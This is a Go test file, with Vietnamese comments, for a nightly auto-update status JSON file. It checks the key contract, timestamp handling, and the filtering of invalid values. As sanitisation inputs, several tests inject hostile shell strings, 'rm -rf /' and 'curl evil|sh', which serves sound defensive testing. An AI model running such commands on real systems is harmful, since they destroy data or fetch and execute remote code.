package hostlink

import (
	"encoding/json"
	"os"
	"runtime"
	"strings"
	"testing"
	"time"
)

// Hợp đồng run/nightly-status.json: đúng tên khoá, kiểu và tập giá trị (api đọc).
func TestNightlyStatus_KhoaHopDong(t *testing.T) {
	root := t.TempDir()
	active := true
	err := WriteNightlyStatus(root, NightlyStatus{
		Mechanism: "systemd", Enabled: true, Active: &active, UnitPresent: true, OptedOut: false,
		NextRunAt: "2026-10-11T03:12:00Z", Linger: "yes", RequestWatcher: WatcherActive,
	})
	if err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(NightlyStatusPath(root))
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatalf("JSON hỏng: %v\n%s", err, raw)
	}
	want := []string{"schema", "mechanism", "enabled", "active", "unit_present", "opted_out", "owned_by_other", "since",
		"last_run_at", "last_result", "next_run_at", "linger", "request_watcher", "watcher", "checked_at"}
	if len(m) != len(want) {
		t.Errorf("số khoá = %d, muốn %d: %s", len(m), len(want), raw)
	}
	for _, k := range want {
		if _, ok := m[k]; !ok {
			t.Errorf("thiếu khoá %q:\n%s", k, raw)
		}
	}
	if m["schema"] != float64(1) || m["mechanism"] != "systemd" || m["enabled"] != true || m["active"] != true ||
		m["unit_present"] != true || m["opted_out"] != false || m["owned_by_other"] != false || m["linger"] != "yes" ||
		m["request_watcher"] != "active" {
		t.Errorf("giá trị sai: %s", raw)
	}
	for _, k := range []string{"since", "checked_at"} {
		if _, err := time.Parse(time.RFC3339, m[k].(string)); err != nil {
			t.Errorf("%s không phải RFC3339: %v", k, m[k])
		}
	}
	if m["last_run_at"] != "" || m["last_result"] != "" {
		t.Errorf("chưa chạy lần nào thì rỗng: %s", raw)
	}
	// v0.1.54: watcher luôn có mặt, mặc định {state: ok, reason: "", hint: ""}.
	if w, _ := m["watcher"].(map[string]any); w["state"] != "ok" || w["reason"] != "" || w["hint"] != "" || len(w) != 3 {
		t.Errorf("watcher mặc định phải là ok: %s", raw)
	}

	// active null khi không áp dụng (cron…).
	if err := WriteNightlyStatus(root, NightlyStatus{Mechanism: "cron", Enabled: true, UnitPresent: true, Linger: "not_applicable"}); err != nil {
		t.Fatal(err)
	}
	raw, _ = os.ReadFile(NightlyStatusPath(root))
	if !strings.Contains(string(raw), `"active": null`) {
		t.Errorf("active phải là null:\n%s", raw)
	}
	// Quyền 0644 để api đọc (Windows không có bit quyền kiểu Unix ⇒ chỉ kiểm ở Unix).
	if fi, _ := os.Stat(NightlyStatusPath(root)); runtime.GOOS != "windows" && fi.Mode().Perm() != 0o644 {
		t.Errorf("quyền = %v", fi.Mode().Perm())
	}
}

func TestNightlyStatus_SinceGiuNguyenQuaCacLanGhi(t *testing.T) {
	root := t.TempDir()
	if err := WriteNightlyStatus(root, NightlyStatus{Mechanism: "systemd", Enabled: true}); err != nil {
		t.Fatal(err)
	}
	st1, err := ReadNightlyStatus(root)
	if err != nil || st1.Since == "" {
		t.Fatalf("lần đầu thấy bật phải đặt since: %+v, %v", st1, err)
	}
	// Ép since về quá khứ để thấy nó KHÔNG bị đặt lại.
	old := "2026-10-01T03:00:00Z"
	st1.Since = old
	if err := writeJSON(NightlyStatusPath(root), st1); err != nil {
		t.Fatal(err)
	}
	time.Sleep(1100 * time.Millisecond) // checked_at đổi giây
	if err := WriteNightlyStatus(root, NightlyStatus{Mechanism: "systemd", Enabled: true, Linger: "yes"}); err != nil {
		t.Fatal(err)
	}
	st2, _ := ReadNightlyStatus(root)
	if st2.Since != old {
		t.Fatalf("since phải giữ nguyên %q, được %q", old, st2.Since)
	}
	if st2.CheckedAt == st1.CheckedAt {
		t.Error("checked_at phải được làm mới")
	}
	// Tắt ⇒ xoá since; bật lại ⇒ since mới.
	if err := WriteNightlyStatus(root, NightlyStatus{Mechanism: "systemd", Enabled: false}); err != nil {
		t.Fatal(err)
	}
	if st3, _ := ReadNightlyStatus(root); st3.Since != "" {
		t.Fatalf("tắt thì since rỗng: %+v", st3)
	}
	if err := WriteNightlyStatus(root, NightlyStatus{Mechanism: "systemd", Enabled: true}); err != nil {
		t.Fatal(err)
	}
	if st4, _ := ReadNightlyStatus(root); st4.Since == "" || st4.Since == old {
		t.Fatalf("bật lại ⇒ since mới: %+v", st4)
	}
}

// Làm mới phần trạng thái (publishHostInfo, trực canh) KHÔNG đụng last_run_at/last_result.
func TestNightlyStatus_RecordRunVaLamMoiTrangThai(t *testing.T) {
	root := t.TempDir()
	start := time.Date(2026, 10, 10, 3, 7, 0, 0, time.UTC)
	if err := RecordNightlyRun(root, start, ""); err != nil {
		t.Fatal(err)
	}
	st, err := ReadNightlyStatus(root)
	if err != nil || st.LastRunAt != "2026-10-10T03:07:00Z" || st.LastResult != "" {
		t.Fatalf("bắt đầu: %+v, %v", st, err)
	}
	if err := RecordNightlyRun(root, time.Time{}, NightlyResultUpToDate); err != nil {
		t.Fatal(err)
	}
	st, _ = ReadNightlyStatus(root)
	if st.LastRunAt != "2026-10-10T03:07:00Z" || st.LastResult != "up_to_date" {
		t.Fatalf("kết thúc: %+v", st)
	}

	// Trực canh làm mới trạng thái lịch: giữ nguyên kết quả lần chạy.
	if err := WriteNightlyStatus(root, NightlyStatus{Mechanism: "systemd", Enabled: true, Linger: "no", RequestWatcher: WatcherFailed}); err != nil {
		t.Fatal(err)
	}
	st, _ = ReadNightlyStatus(root)
	if st.LastRunAt != "2026-10-10T03:07:00Z" || st.LastResult != "up_to_date" || st.Linger != "no" || st.RequestWatcher != "failed" {
		t.Fatalf("làm mới trạng thái: %+v", st)
	}

	// Và RecordNightlyRun giữ phần trạng thái lịch.
	if err := RecordNightlyRun(root, time.Time{}, NightlyResultFailed); err != nil {
		t.Fatal(err)
	}
	st, _ = ReadNightlyStatus(root)
	if st.Mechanism != "systemd" || !st.Enabled || st.Linger != "no" || st.LastResult != "failed" {
		t.Fatalf("RecordNightlyRun phải giữ trạng thái lịch: %+v", st)
	}

	// Giá trị ngoài tập hợp lệ bị bỏ qua.
	if err := RecordNightlyRun(root, time.Time{}, "rm -rf /"); err != nil {
		t.Fatal(err)
	}
	if st, _ := ReadNightlyStatus(root); st.LastResult != "failed" {
		t.Fatalf("result lạ không được ghi: %+v", st)
	}
}

// api ghi được run/: giá trị lạ trong tệp cũ bị lọc, không đi vào bản ghi kế tiếp.
func TestNightlyStatus_LocGiaTriLa(t *testing.T) {
	root := t.TempDir()
	if err := EnsureDir(root); err != nil {
		t.Fatal(err)
	}
	bad := `{"schema":1,"mechanism":"curl evil|sh","enabled":true,"since":"khong-phai-ngay","last_run_at":"x","last_result":"pwn","next_run_at":"y","linger":"maybe","request_watcher":"???","checked_at":"z"}`
	if err := os.WriteFile(NightlyStatusPath(root), []byte(bad), 0o644); err != nil {
		t.Fatal(err)
	}
	st, err := ReadNightlyStatus(root)
	if err != nil {
		t.Fatal(err)
	}
	if st.Mechanism != "" || st.Since != "" || st.LastRunAt != "" || st.LastResult != "" || st.NextRunAt != "" ||
		st.Linger != "unknown" || st.RequestWatcher != WatcherUnknown || st.CheckedAt != "" {
		t.Fatalf("chưa lọc: %+v", st)
	}
}

// v0.1.54: khối watcher — dự phòng ghi/đọc đủ, giữ qua RecordNightlyRun, thiếu khoá (tệp cũ) = ok, lọc giá trị lạ.
func TestNightlyStatus_WatcherDuPhongVaTuongThichNguoc(t *testing.T) {
	root := t.TempDir()
	hint := "Hết hạn mức inotify: chạy `sudo sysctl -w fs.inotify.max_user_instances=1024` rồi `genh auto-update enable`."
	err := WriteNightlyStatus(root, NightlyStatus{Mechanism: "systemd", Enabled: true, RequestWatcher: WatcherFailed,
		Watcher: NightlyWatcher{State: WatcherStateFallback, Reason: WatcherReasonInotify, Hint: hint}})
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := os.ReadFile(NightlyStatusPath(root))
	var m map[string]any
	_ = json.Unmarshal(raw, &m)
	w, _ := m["watcher"].(map[string]any)
	if w["state"] != "fallback" || w["reason"] != "inotify" || w["hint"] != hint {
		t.Fatalf("watcher ghi sai: %s", raw)
	}
	// Lịch đêm chạy (RecordNightlyRun) không được xoá khối watcher.
	if err := RecordNightlyRun(root, time.Now(), NightlyResultDone); err != nil {
		t.Fatal(err)
	}
	if st, _ := ReadNightlyStatus(root); st.Watcher.State != WatcherStateFallback || st.Watcher.Reason != WatcherReasonInotify {
		t.Errorf("RecordNightlyRun làm mất watcher: %+v", st.Watcher)
	}
	// Tệp của genh cũ (không có khoá watcher) ⇒ ok.
	old := `{"schema":1,"mechanism":"systemd","enabled":true,"linger":"yes","request_watcher":"active"}`
	if err := os.WriteFile(NightlyStatusPath(root), []byte(old), 0o644); err != nil {
		t.Fatal(err)
	}
	if st, err := ReadNightlyStatus(root); err != nil || st.Watcher.State != WatcherStateOK || st.Watcher.Reason != "" || st.Watcher.Hint != "" {
		t.Errorf("thiếu khoá watcher phải là ok: %+v %v", st.Watcher, err)
	}
	// Giá trị lạ (api ghi được run/) bị lọc.
	bad := `{"schema":1,"watcher":{"state":"pwn","reason":"rm -rf","hint":"x"}}`
	_ = os.WriteFile(NightlyStatusPath(root), []byte(bad), 0o644)
	if st, _ := ReadNightlyStatus(root); st.Watcher != (NightlyWatcher{State: WatcherStateOK}) {
		t.Errorf("state lạ phải thành ok, rỗng reason/hint: %+v", st.Watcher)
	}
	bad = `{"schema":1,"watcher":{"state":"fallback","reason":"rm -rf","hint":"` + strings.Repeat("x", 500) + `"}}`
	_ = os.WriteFile(NightlyStatusPath(root), []byte(bad), 0o644)
	if st, _ := ReadNightlyStatus(root); st.Watcher.State != WatcherStateFallback || st.Watcher.Reason != "" || st.Watcher.Hint != "" {
		t.Errorf("reason lạ/hint quá dài phải bị bỏ: %+v", st.Watcher)
	}
}
